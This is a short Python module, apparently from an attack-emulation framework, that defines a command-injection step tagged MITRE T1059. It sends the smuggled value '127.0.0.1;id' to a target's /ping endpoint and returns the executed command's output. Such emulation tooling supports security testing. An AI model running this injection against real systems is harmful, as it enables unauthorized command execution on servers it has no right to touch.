import requests
from .base import AttackStep


class InjectionStep(AttackStep):
    name = "Exploit command injection"
    mitre_id = "T1059"

    def __init__(self, target_url: str):
        self.target_url = target_url

    def execute(self) -> dict:
        r = requests.get(f"{self.target_url}/ping", params={"host": "127.0.0.1;id"})
        output = r.json()["stdout"].strip()
        return {"summary": output}
